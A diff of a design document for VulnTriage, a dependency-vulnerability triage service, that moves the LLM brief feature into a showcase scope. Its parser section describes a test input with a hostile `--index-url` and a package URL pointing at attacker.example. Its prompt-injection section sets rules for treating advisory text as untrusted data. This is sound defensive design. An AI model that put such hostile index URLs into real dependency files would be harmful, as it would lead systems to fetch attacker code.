@@ -8,12 +8,12 @@ Conventions: `VERIFY:` marks an external detail not yet confirmed. The ASSUMPTIO
 
 | Component | Responsibility | Workflow steps owned | User stories | Talks to | Tier |
 |---|---|---|---|---|---|
-| React frontend | Dashboard: assets, findings per asset, rank reason, brief or "brief unavailable", status and audit trail, risk acceptance, sign-in. All backend calls in one service layer. | none (shows results; starts registration and manual re-scan through the API) | US-1, US-4, US-5, US-6, US-10, US-11 | FastAPI backend (HTTPS, session cookie) | A |
-| FastAPI backend | The only owner of VulnTriage data. Asset registration, repository read, lockfile parsing, OSV matching, KEV/EPSS enrichment, scoring, brief generation with the guardrail, status changes and audit trail, the top-tier owner notification (creates the NotificationJob, sends the email, records `notification.enqueue` and `notification.deliver`; decision H7), the daily refresh and re-scan schedule (scheduler in the backend's background worker, task 38), the API for frontend, MCP server and responder (and, in the showcase, n8n). | inventory, match, enrich, prioritise, brief, re-scan; creates and delivers the top-tier notification job (showcase: creates route jobs for n8n) | US-1, US-2, US-3, US-4, US-5, US-6, US-7, US-8, US-9, US-10, US-11, US-12, US-13, US-14 | VulnTriage database (SQLAlchemy: SQLite in development, Postgres in Compose and AWS); OSV; CISA KEV; FIRST EPSS; GitHub repository read; LLM provider; OpenTelemetry Collector | A |
+| React frontend | Dashboard: assets, findings per asset, rank reason, (showcase: brief or "brief unavailable"; for submission the structured finding), status and audit trail, risk acceptance, sign-in. All backend calls in one service layer. | none (shows results; starts registration and manual re-scan through the API) | US-1, US-4, US-5, US-6 (showcase, `_docs/roadmap-showcase.md`), US-10, US-11 | FastAPI backend (HTTPS, session cookie) | A |
+| FastAPI backend | The only owner of VulnTriage data. Asset registration, repository read, lockfile parsing, OSV matching, KEV/EPSS enrichment, scoring, (showcase: brief generation with the guardrail), status changes and audit trail, the top-tier owner notification (creates the NotificationJob, sends the email, records `notification.enqueue` and `notification.deliver`; decision H7), the daily refresh and re-scan schedule (scheduler in the backend's background worker, task 38), the API for frontend, MCP server and responder (and, in the showcase, n8n). | inventory, match, enrich, prioritise, (showcase: brief), re-scan; creates and delivers the top-tier notification job (showcase: creates route jobs for n8n) | US-1, US-2, US-3, US-4, US-5, US-6 (showcase), US-7, US-8, US-9, US-10, US-11, US-12, US-13, US-14 | VulnTriage database (SQLAlchemy: SQLite in development, Postgres in Compose and AWS); OSV; CISA KEV; FIRST EPSS; GitHub repository read; LLM provider (showcase, X4); OpenTelemetry Collector | A |
 | Postgres | VulnTriage's database in Compose and AWS. SQLite replaces it in local development and Tier A. | none | US-1, US-11 (persistence) | nothing; accepts connections only from the FastAPI backend | B |
 | n8n (showcase, `_docs/roadmap-showcase.md`; not built for submission) | Scheduled and event-driven routing: daily refresh and re-scan triggers, top-tier notification and tracker issue, reminders, escalation, weekly digest, closing tracker issues. Workflows exported as JSON. | route; triggers enrich refresh and re-scan | US-7, US-8, US-9, US-10, US-16 | FastAPI backend API (n8n token); SMTP relay; GitHub tracker repo `vuln-triage-findings`; OpenTelemetry Collector (VERIFY: n8n's own OpenTelemetry support) | B |
 | MCP server | Four read-only tools for an AI assistant. | none | US-12 | FastAPI backend API (MCP read-only token); the MCP client over stdio | A |
-| LLM | Writes the brief text from structured fields; never decides anything. | brief (text only; the backend owns the step) | US-6 | nothing; called by the backend | A |
+| LLM (showcase, `_docs/roadmap-showcase.md`; not built for submission) | Writes the brief text from structured fields; never decides anything. | brief (text only; the backend owns the step) | US-6 | nothing; called by the backend | A |
 | OpenTelemetry Collector | Receives OTLP from the backend (showcase: and n8n if supported), drops non-allowlisted attributes, exports. | none | US-13 | Prometheus, Loki, Tempo | C |
 | Prometheus | Metrics store; source of the US-14 alert metric. | none | US-13, US-14 | OpenTelemetry Collector (receives metrics) | C |
 | Loki | Structured log store. | none | US-13, US-15 | OpenTelemetry Collector (receives logs) | C |
@@ -37,12 +37,12 @@ Data ownership:
 | 2. Match | Backend | Same run as step 1 | OSV queried per entry with a known version; advisories stored; findings created or updated (E4, E7, E9) |
 | 3. Enrich | Backend | Same run as step 1; the daily refresh the backend scheduler runs (US-7; task 38; showcase: n8n calls it) | KEV and EPSS values attached per CVE from the cached copies; stale markers set on failure (E3) |
 | 4. Prioritise | Backend | After steps 2-3 in every scan, and after every refresh | Tier, rank and rank reason recomputed (Prioritisation) |
-| 5. Brief | Backend (calls the LLM) | A finding is created or its fixed version changes; P1 findings first | Brief stored as `available`, or the "brief unavailable" marker |
+| 5. Brief (showcase, `_docs/roadmap-showcase.md`; for submission the step is skipped and the notification carries the structured finding) | Backend (calls the LLM) | A finding is created or its fixed version changes; P1 findings first | Brief stored as `available`, or the "brief unavailable" marker |
 | 6. Route (for submission the backend delivers the top-tier owner notification, decision H7; showcase: n8n delivers the rest) | Backend (creates the job and sends the email); showcase: n8n | The top-tier job is created after steps 2-4; showcase: n8n polls the API for jobs and runs schedules for reminders and digest | Owner notification for submission; showcase adds tracker issue, reminders, escalation, digest, issue close (Routing and notifications) |
 | 7. Re-scan | Backend | The backend scheduler's daily run after the refresh (task 38; showcase: n8n's daily schedule), and a person's "Re-scan" action in the dashboard | Steps 1-5 again; findings set `fixed` (US-10), `withdrawn` or restored (E4), or reopened (E7) |
 
 ASSUMPTION: (A3) re-scans have two triggers, a daily schedule (after the KEV/EPSS refresh) and a person's on-demand action; registration starts the first scan. For submission the backend scheduler runs the schedule (a scheduler in the backend's background worker, task 38 in `_docs/tasks.md`). Showcase (n8n is a showcase item, `_docs/roadmap-showcase.md`): the n8n schedule is not built for submission.
-ASSUMPTION: (A4) scans and brief generation run as background jobs inside the backend, using a job table in VulnTriage's database and one worker; no separate broker.
+ASSUMPTION: (A4) scans and brief generation (showcase: the brief part; the scan part stays) run as background jobs inside the backend, using a job table in VulnTriage's database and one worker; no separate broker.
 
 ## Ingestion and matching
 
@@ -73,7 +73,7 @@ Lockfile entries without a version get the "version unknown" treatment, includin
 
 Limit: nothing named in a requirements file is ever fetched. Enforced in the parser: it is a pure function from file text to entries and warnings, with no network client; `-r` includes are resolved by the repository reader, inside the repository only, after path normalisation (no `..` escape, no URL). Refused case (Stage 4 test): a file with `--index-url https://attacker.example/simple` and `pkg @ https://attacker.example/pkg.whl` produces two warnings and zero outbound requests (the test's network stub fails on any call).
 
-Version ordering (for "lowest version greater than", range checks and the guardrail):
+Version ordering (for "lowest version greater than", range checks and the fixed version; showcase: the brief guardrail):
 
 | Ecosystem | Rule | Library |
 |---|---|---|
@@ -106,8 +106,8 @@ Withdrawal: an advisory is withdrawn when OSV marks it so (VERIFY: OSV's `withdr
 | Advisory | osv_id, vulnerability_id, modified, withdrawn_at (nullable), summary, details, affected (ranges and events), references | belongs to Vulnerability. summary, details and references are untrusted data, stored as text and never rendered as links |
 | VulnerabilityAlias | alias_id (unique), vulnerability_id | Every advisory's primary id and every alias. A lookup by any id resolves `alias_id → vulnerability_id`, so a GHSA, PYSEC or CVE id returns the same findings (US-12, #9 finding 2) |
 | Signal | cve_id, kev_listed (nullable), kev_date_added, kev_fetched_at, kev_stale, epss_score (nullable), epss_percentile, epss_date, epss_fetched_at, epss_stale | per CVE; read by Findings through their Vulnerability |
-| Finding | id, asset_id, vulnerability_id, ecosystem, package; unique (asset_id, ecosystem, package, vulnerability_id); fixed_version (nullable = "no fixed version"), status, status_before_withdrawal (nullable, for the E4 restore), tier, rank_inputs, rank_reason, first_detected_at, current_lifecycle_id, fixed_at, stale, stale_since, signals_changed | belongs to Asset and Vulnerability; links to Dependencies; has Lifecycles, Briefs, AuditEntries |
-| Brief | id, finding_id, lifecycle_id, status (`available` or `unavailable`), rejection_reason (internal), summary, impact, remediation, fix_version (nullable), reference_link (built by VulnTriage), model, prompt_version, created_at | belongs to Finding |
+| Finding | id, asset_id, vulnerability_id, ecosystem, package; unique (asset_id, ecosystem, package, vulnerability_id); fixed_version (nullable = "no fixed version"), status, status_before_withdrawal (nullable, for the E4 restore), tier, rank_inputs, rank_reason, first_detected_at, current_lifecycle_id, fixed_at, stale, stale_since, signals_changed | belongs to Asset and Vulnerability; links to Dependencies; has Lifecycles, (showcase: Briefs), AuditEntries |
+| Brief (showcase, `_docs/roadmap-showcase.md`; not built for submission) | id, finding_id, lifecycle_id, status (`available` or `unavailable`), rejection_reason (internal), summary, impact, remediation, fix_version (nullable), reference_link (built by VulnTriage), model, prompt_version, created_at | belongs to Finding |
 | Lifecycle | id, finding_id, number, started_at (first detection, or the E7 reopen time), due_at, highest_tier, entered_p1_at, tracker_issue_number, owner_notified_at, ended_at | belongs to Finding; has NotificationJobs. US-8 idempotency basis |
 | NotificationJob | id, lifecycle_id (nullable for the digest), kind (`top tier`, `reminder`, `escalation`, `signals changed`, `issue close`, `digest`), recipient (`owner`, `security lead`), idempotency_key (unique), state (`pending`, `claimed`, `sent`, `failed`, `held: ownerless`, `held: owner email missing`, `held: configuration error`), attempts, last_error_code, traceparent (set at creation, never null), created_at, sent_at | belongs to Lifecycle |
 | AuditEntry | id, finding_id or asset_id, field, previous_value (nullable: none on creation), new_value, actor (user id, `re-scan` or `system`), source (`dashboard`, `OSV`, ...), reason (required for `risk accepted`), restores_entry_id (nullable, E4), created_at | append-only; belongs to Finding or Asset |
@@ -158,10 +158,10 @@ Field names in the right-hand column are the Data model's; the wire spelling is 
 | `fixedAt` | `Finding.fixed_at` (same) |
 | No lifecycle or notification state | Lifecycle (`highest_tier`, `entered_p1_at`, `tracker_issue_number`, `owner_notified_at`) and NotificationJob state |
 | No stale, signals-changed or withdrawal fields | `Finding.stale`, `stale_since`, `signals_changed` (E8), `status_before_withdrawal` (E4) |
-| `Finding.brief: Brief \| null`, one per finding; a rejected brief is `null` | Many Brief rows per finding, each with `lifecycle_id`, cached per (lifecycle, fixed version, prompt version, model) (A23); an `unavailable` brief is a stored row with `rejection_reason` (internal). Which brief the API returns is #23's decision |
-| `briefStatus: "available" \| "rejected"` | `Brief.status`: `available` or `unavailable` (the "brief unavailable" marker covers rejection, timeout and error) |
-| `Brief { summary, impact, remediation, advisoryReference }` | `summary`, `impact`, `remediation`, `fix_version` (nullable), `reference_link` (built by VulnTriage from the primary id), plus `model`, `prompt_version`, `created_at` |
-| `structuredSummary: string` | No counterpart: the structured finding is the finding's own fields, sent with the "brief unavailable" marker; no stored summary text |
+| (showcase) `Finding.brief: Brief \| null`, one per finding; a rejected brief is `null` | Many Brief rows per finding, each with `lifecycle_id`, cached per (lifecycle, fixed version, prompt version, model) (A23); an `unavailable` brief is a stored row with `rejection_reason` (internal). Which brief the API returns is #23's decision |
+| (showcase) `briefStatus: "available" \| "rejected"` | `Brief.status`: `available` or `unavailable` (the "brief unavailable" marker covers rejection, timeout and error) |
+| (showcase) `Brief { summary, impact, remediation, advisoryReference }` | `summary`, `impact`, `remediation`, `fix_version` (nullable), `reference_link` (built by VulnTriage from the primary id), plus `model`, `prompt_version`, `created_at` |
+| `structuredSummary: string` | No counterpart: the structured finding is the finding's own fields, sent (showcase: with the "brief unavailable" marker); no stored summary text |
 | No advisory text | `Advisory.summary`, `details`, `references`, sent only as labelled untrusted data |
 | `AuditEntry.who`, `when` | `AuditEntry.actor` (user id, `re-scan` or `system`) and `created_at` |
 | `AuditEntry.previousValue: string` | Nullable (none on creation, I7) |
@@ -224,6 +224,8 @@ Partial owner: ASSUMPTION: (A21) an owner with an email but no name is notified 
 
 ## LLM brief
 
+Showcase (post-submission): the LLM brief below (US-6) is a showcase item (X4 in `_docs/roadmap-showcase.md`) and is not built for submission. For submission the owner notification and the dashboard carry the structured finding, with no brief.
+
 Inputs (structured fields only): primary id, aliases, ecosystem, package, installed version, fixed version for this dependency (or none), tier, rank reason, KEV value, EPSS, asset name, criticality, internet-facing, and the advisory `summary` as one labelled untrusted field. Never sent: `details`, references, owner contact, repository URL, lockfile content. ASSUMPTION: (A22) the advisory summary is included, truncated to 500 characters, because a brief without it can't say what the flaw is.
 
 Prompt structure (#9 finding 11): the system message holds every instruction and says that the value of `untrusted_advisory_summary` is data from a third party and never instructions. The user message is one JSON object of the fields above; the summary is a JSON string value, so it can't close a delimiter. No instruction is built from advisory text.
@@ -249,7 +251,7 @@ Guardrail, in order; the first failure rejects:
 
 ASSUMPTION: (A24) checks 3 and 4 are the output check beyond the fix version.
 
-Rejected-brief path: the brief is stored as `unavailable` with an internal rejection reason; a structured log event `brief.rejected` records finding id, reason code, model and trace id, and no advisory text or LLM output; the owner notification carries the structured finding with the "brief unavailable" marker. An LLM timeout, error or refusal takes the same path. The guardrail never blocks or delays a notification beyond the timeout. Refused case (Stage 4 test): with F = `1.2.5`, a stub returning `fix_version: "1.2.6"` gives `unavailable`, and the notification payload contains no brief field.
+Rejected-brief path (showcase): the brief is stored as `unavailable` with an internal rejection reason; a structured log event `brief.rejected` records finding id, reason code, model and trace id, and no advisory text or LLM output; the owner notification carries the structured finding with the "brief unavailable" marker (showcase: the marker). For submission the owner notification carries the structured finding and no brief. An LLM timeout, error or refusal takes the same path (showcase). The guardrail never blocks or delays a notification beyond the timeout. Refused case (Stage 4 test): with F = `1.2.5`, a stub returning `fix_version: "1.2.6"` gives `unavailable`, and the notification payload contains no brief field.
 
 ## Routing and notifications
 
@@ -283,7 +285,7 @@ Missing security-lead contact (I10): the backend validates `SECURITY_LEAD_NAME` 
 | FIRST EPSS | `GET https://api.first.org/data/v1/epss?cve=<list>` for CVEs that have findings. VERIFY: URL, batch size, fields `epss`, `percentile`, `date`, rate limit, attribution terms. | Per-CVE score and date in Signal | Daily (backend scheduler; showcase: n8n), and on a scan for CVEs with no score | Last-known values kept, `epss_stale` set; next run retries |
 | GitHub repository read | Contents API with the read-only token. VERIFY: endpoint, rate limit for fine-grained tokens. | Not cached; each scan reads the default branch head and records the commit SHA | Every scan | `scan failed`, `repository unavailable`; findings kept |
 | GitHub tracker issues (showcase: n8n; not built for submission) | n8n, issues API on `vuln-triage-findings` with the tracker token. VERIFY: endpoints. | Issue number stored per lifecycle through the API | Per job | Job stays `pending` or `failed` and is retried; a top-tier owner notification that misses its window fires US-14 |
-| LLM provider | Backend, HTTPS API, pinned model, `LLM_MODE=stub` in tests. VERIFY: endpoint, limits, pricing, data retention. | Brief per (lifecycle, fixed version, prompt version, model) | When inputs change | "brief unavailable" path |
+| LLM provider (showcase, X4; not built for submission) | Backend, HTTPS API, pinned model, `LLM_MODE=stub` in tests. VERIFY: endpoint, limits, pricing, data retention. | Brief per (lifecycle, fixed version, prompt version, model) | When inputs change | "brief unavailable" path |
 | Amazon SES API (MailHog in development and tests) | The backend sends email through the SES API with the server's instance role, from one verified sender address (Routing and notifications, email route; showcase: n8n sends over its own mail node). VERIFY: SES API operation, region and sending limits. | none | Per job | Job `failed`, retried on the next delivery attempt; US-14 alert if a top-tier job misses its window |
 | AWS at runtime | Secrets Manager read at container start (VERIFY), GHCR image pulls at deploy (public images, no pull credential; VERIFY), SES as above. | none | At start or deploy | Container doesn't start; the deploy fails and the previous containers keep running until the deploy command succeeds (VERIFY: `docker compose up -d` leaves running containers in place when a pull fails) |
 
@@ -322,7 +324,7 @@ Credentials:
 | MCP API token (showcase: US-12 and the MCP server; not built for submission) | GET the read endpoints the four tools use | Any write | API authorisation (role `mcp-read`, GET only) | `POST` to the assets endpoint, or risk acceptance on a finding, gets 403 `forbidden` and no state change (US-12) |
 | Responder GitHub token or App (D2) | Push branches and open pull requests on the application repository | Push to `main`, merge, change settings, touch other repositories; no AWS credential at all | Fine-grained token or App: contents write and pull requests write on that repository only; branch protection on `main` requiring a pull request and the human's review, with no bypass (VERIFY: fine-grained tokens can't be limited to a branch, so branch protection is the enforcement) | `git push origin HEAD:main` with it is rejected |
 | Responder API and Grafana tokens | GET findings and jobs through the API; read logs and dashboards from Loki and Grafana with the Viewer token | Any API write; editing dashboards or alert rules | API authorisation (role `responder-read`, GET only); Grafana Viewer role (VERIFY) | `POST /notification-jobs/{id}/claim` with it gets 403 and the job stays `pending` |
-| LLM API keys (one for the backend, one for the responder) | Call the provider's model API | Be used by any other component; exceed the spend limit | Each key only in its holder's secret; provider-side spend limit (VERIFY) | A call past the spend limit is refused by the provider (VERIFY); the backend then takes the "brief unavailable" path |
+| LLM API keys (showcase, X4: the backend's key; the responder's key is local Compose only, as the secrets table above says) | Call the provider's model API | Be used by any other component; exceed the spend limit | Each key only in its holder's secret; provider-side spend limit (VERIFY) | A call past the spend limit is refused by the provider (VERIFY), for the responder's key; showcase: the backend then takes the "brief unavailable" path |
 | CI deploy credentials (GitHub OIDC to two IAM roles, created by Terraform) | Dev role: run the dev deploy on the server (VERIFY: SSM Run Command or equivalent) for the dev Compose project only. Prod role: run the production deploy on the server with an existing image tag. Images are pushed to GHCR with the workflow's `GITHUB_TOKEN`, not an AWS role | Run from a pull request or another branch; run the production deploy with the dev role; change IAM, Terraform state or the server's configuration; read secrets | The roles' trust policies (built in task 17) with conditions on repository, branch and GitHub environment (VERIFY: OIDC `sub` claim format); IAM policies scoped to the one server and the deploy command; the `production` environment's required reviewer | A pull-request workflow's assume-role call is denied; the dev role invoking the production deploy is denied |
 | Database credential | Read and write VulnTriage's database | Be used by any component except the backend | Only the backend's environment holds it; the database is on a network only the backend joins (Compose network, AWS security group, VERIFY) | A connection from any other container (for example the Collector; showcase: n8n) to the database fails |
 | Dashboard session | Act as the signed-in user's role | Work after expiry or logout; work cross-site; accept risk with an empty reason | API authorisation (session lookup and expiry, SameSite cookie, CSRF header, US-11 reason check) | A request with an expired session gets 401; risk acceptance with a whitespace reason gets 422 and no change |
@@ -331,7 +333,7 @@ Prompt injection, per flow in the spec's Advisory-derived text table (#9 finding
 
 | Flow | Mechanism |
 |---|---|
-| LLM brief | Prompt structure and guardrail (LLM brief); link built by VulnTriage |
+| LLM brief (showcase, X4; not built for submission) | Prompt structure and guardrail (LLM brief); link built by VulnTriage |
 | Owner notification, US-9 reminder and escalation, weekly digest, E8 "signals changed" notice | `text/plain` email only, labelled fields, advisory text only under "Advisory summary (untrusted, from OSV):"; URLs in advisory text are defanged (`https://` becomes `hxxps[:]//`) so mail clients don't link them |
 | US-14 alert payload | The alert's labels and template carry finding id and tier only; no advisory field exists in the metric, so none can leak |
 | Responder reading the API | Its instructions say API advisory text is untrusted data; it never runs commands, opens URLs or uses paths taken from advisory text; its credentials can't push to `main` or touch AWS |
@@ -347,7 +349,7 @@ The US-13 journey is scan → match → score → notification job → backend d
 
 | Signal | What |
 |---|---|
-| Trace | Root span `scan.run`, children `repository.read`, `osv.query`, `signals.enrich`, `prioritise`, `brief.generate`, `notification.enqueue`, and later `notification.deliver` |
+| Trace | Root span `scan.run`, children `repository.read`, `osv.query`, `signals.enrich`, `prioritise`, `brief.generate` (showcase), `notification.enqueue`, and later `notification.deliver` |
 | Metric | `vt_notifications_total{kind,outcome}`, `vt_notification_delivery_seconds`, `vt_top_tier_notification_overdue{finding_id,tier}` (0 or 1) |
 | Log | JSON lines: `event`, `trace_id`, `span_id`, ids and outcome codes only |
 
@@ -429,7 +431,7 @@ Environment (D1, human decision of 2026-10-20): a Compose-based dev container re
 
 | Check | Where it runs |
 |---|---|
-| Backend unit tests (parser, version ordering, fixed version, tiers and tie-breaks, guardrail, authorisation refused cases), with stubs for OSV, KEV, EPSS, GitHub and the LLM | Locally in the sandbox, no Docker, SQLite in memory |
+| Backend unit tests (parser, version ordering, fixed version, tiers and tie-breaks, guardrail (showcase), authorisation refused cases), with stubs for OSV, KEV, EPSS, GitHub and the LLM (showcase) | Locally in the sandbox, no Docker, SQLite in memory |
 | Backend integration tests (API and database through the app, stubbed externals) | Locally on SQLite (no Docker); against Postgres in the sandbox once #31's service container exists, and in CI |
 | Frontend tests (vitest) and MCP server tests against a stub API | Locally, no Docker |
 | Image builds, `docker compose up` of the full stack, Compose integration tests (delivery to MailHog, Collector allowlist, alert rule; showcase: n8n workflows end to end) | CI only (route 1), or the human on the host (route 2) |
@@ -464,7 +466,7 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, Collecto
 6. Closed: the "Module 3/4 pattern" is followed as adapted by H2-H4 (Terraform, one server for both environments, GHCR); see Deployment and (A36). VERIFY: what the pattern prescribes beyond that stays unconfirmed, as it does not change the shape.
 7. Closed: no domain; hostnames come from `sslip.io` (H5) with Let's Encrypt HTTPS (Deployment, (A36)). VERIFY: Let's Encrypt rate limits for `sslip.io` names.
 8. The EPSS threshold T = 0.10 (A18) and the "exposed asset" definition (A17): confirm.
-9. Which LLM provider and model (A23)?
+9. (Showcase, X4) Which LLM provider and model (A23)? Candidate provider (not decided): the Gemini free tier, which could serve the responder's local key and the future brief; VERIFY: free-tier rate limits, whether free-tier data may be used for model improvement (the responder reads application code and logs), current model names, and that its SDK is a dependency (ask before adding).
 10. An exploited vulnerability with no CVE can never reach `P1` or `P2` under these rules (E11 has no KEV or EPSS). Accept, or add a rule?
 11. Does Juice Shop commit a supported lockfile (A41)?
 
@@ -473,7 +475,7 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, Collecto
 - (A1) Component tiers: Postgres is Tier B (n8n too, showcase); the MCP server is Tier A.
 - (A2) Grafana keeps its state in its default embedded store on its own volume (showcase: n8n too).
 - (A3) Re-scans run on a daily schedule after the refresh (backend scheduler for submission; n8n in the showcase) and on a person's demand; registration starts the first scan.
-- (A4) Scans and briefs run as background jobs in the backend with a job table and one worker.
+- (A4) Scans and briefs (showcase: the briefs) run as background jobs in the backend with a job table and one worker.
 - (A5) Lockfiles are looked for at the repository root only.
 - (A6) One finding per package across several files; highest per-entry fixed version; `fixed` only when every entry is clear.
 - (A8) The `uv.lock` and `package-lock.json` entry handling, including lockfileVersion 1 as a parse error.
@@ -488,9 +490,9 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, Collecto
 - (A19) "Oldest finding" uses first detection time; the final tie-break is finding id.
 - (A20) Tiers cover `open` and `risk accepted`; the ranked list is `open` only; E8 escalation means a tier rise or becoming `KEV: listed`.
 - (A21) An email-only owner is notified; a name-only owner's notification is held.
-- (A22) The brief prompt includes the advisory summary, truncated to 500 characters.
-- (A23) LLM provider chosen with the human; 20 s timeout; briefs cached per lifecycle, fixed version, prompt version and model.
-- (A24) The brief output check rejects other version tokens and any URL in text fields.
+- (A22, showcase) The brief prompt includes the advisory summary, truncated to 500 characters.
+- (A23, showcase) LLM provider chosen with the human; 20 s timeout; briefs cached per lifecycle, fixed version, prompt version and model.
+- (A24, showcase) The brief output check rejects other version tokens and any URL in text fields.
 - (A25, showcase: n8n) n8n poll every 5 minutes; refresh 06:00 UTC; digest Monday 08:00 UTC.
 - (A26) Email sent by the backend: MailHog in development and tests, the Amazon SES API with the instance role from one verified sender in AWS.
 - (A27) US-9 windows `P1` 7, `P2` 14, `P3` 30, `P4` 90 days; reminders and escalation at due and weekly after.
